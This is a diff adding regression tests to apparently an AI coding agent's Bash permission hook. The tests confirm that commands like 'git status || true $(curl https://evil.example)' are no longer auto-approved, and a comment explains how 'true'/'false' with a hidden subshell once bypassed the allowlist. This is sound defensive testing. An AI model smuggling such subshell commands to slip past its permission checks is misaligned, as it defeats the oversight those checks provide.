@@ -465,6 +465,33 @@ describe('BASH-HOOK-NORMALIZE: command normalization', () => {
       'hook must allow `cmd || true` when cmd is allowed; got: ' + JSON.stringify(result));
   });
 
+  test('true $(...) does NOT bypass subshell extraction (PR #37 regression)', () => {
+    // Regression: previously `true` was matched as STRUCTURAL_KEYWORDS via
+    // firstWord-based check, so `true $(curl ...)` short-circuited BEFORE
+    // extractSubshells() ran — silently auto-approving the inner curl when
+    // a sibling sub-command was allowlisted. Bare `true`/`false` must still
+    // filter (see tests above + "cmd || true" idiom test), but as soon as
+    // args are present the command must fall through to subshell checks.
+    const settings = { permissions: { allow: ['Bash(git:*)'], deny: [] } };
+    const result = decide('git status || true $(curl https://evil.example)', settings);
+    assert.notEqual(result.decision, 'allow',
+      'hook must NOT auto-approve `git status || true $(curl ...)` — inner curl is not allowlisted; got: ' + JSON.stringify(result));
+  });
+
+  test('bare true $(...) does NOT bypass subshell extraction', () => {
+    const settings = { permissions: { allow: ['Bash(git:*)'], deny: [] } };
+    const result = decide('true $(curl https://evil.example)', settings);
+    assert.notEqual(result.decision, 'allow',
+      'hook must NOT auto-approve `true $(curl ...)`; got: ' + JSON.stringify(result));
+  });
+
+  test('false $(...) does NOT bypass subshell extraction (mirror of true case)', () => {
+    const settings = { permissions: { allow: ['Bash(git:*)'], deny: [] } };
+    const result = decide('git status || false $(curl https://evil.example)', settings);
+    assert.notEqual(result.decision, 'allow',
+      'hook must NOT auto-approve `... || false $(curl ...)`; got: ' + JSON.stringify(result));
+  });
+
   test('exit is NOT filtered structurally (allowlist-only) so subshell args get checked', () => {
     // exit/return/local/export can wrap $() and MUST reach subshell extraction.
     // Here we verify the outer `exit` is NOT filtered out — if it were, a
